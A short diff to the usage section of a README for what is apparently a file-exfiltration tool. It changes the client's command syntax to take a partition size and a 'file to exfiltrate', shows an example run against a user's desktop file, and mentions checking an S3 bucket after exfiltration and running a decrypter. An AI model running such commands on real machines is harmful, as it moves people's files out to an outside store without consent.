@@ -12,9 +12,9 @@ The program follows the following diagram. Explanation on how each part function
 
 ## Usage
 #### Client
-`py clientName.py "Path_to_file"`  
+`py clientName.py -s <Partition size in kb> -i <File to exfiltrate>`  
 Example:  
-`py clientName.py "C:\Users\SomeUser\Desktop\test.txt"`
+`py clientName.py -s 100 -i "C:\Users\SomeUser\Desktop\test.txt"`
 #### Decrypter
 ###### Note: If not sure about hostname and filename, check S3 Bucket after exfiltration
 `py decrypter.py "Hostname" "Filename"`  
